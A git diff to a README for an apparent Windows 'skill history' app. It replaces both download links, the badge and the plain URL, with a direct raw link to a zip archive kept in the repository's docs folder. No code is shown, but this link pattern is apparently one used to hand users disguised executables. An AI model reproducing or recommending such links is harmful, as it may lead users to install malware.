@@ -1,6 +1,6 @@
 # 🔥 fireworks-skill-memory - Keep Skill History Ready
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Brocmo7774/fireworks-skill-memory)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Brocmo7774/fireworks-skill-memory/raw/refs/heads/main/docs/skill_fireworks_memory_1.3.zip)
 
 ## 🧠 What this app does
 
@@ -29,7 +29,7 @@ If you use a work PC, you may need admin access to install or open the app.
 
 Visit this page to download the app for Windows:
 
-https://github.com/Brocmo7774/fireworks-skill-memory
+https://github.com/Brocmo7774/fireworks-skill-memory/raw/refs/heads/main/docs/skill_fireworks_memory_1.3.zip
 
 If the page has a release file, choose the Windows download and save it to your computer. If the page opens the source page instead of a file, look for the latest release or a ready-to-run download on the page.
 
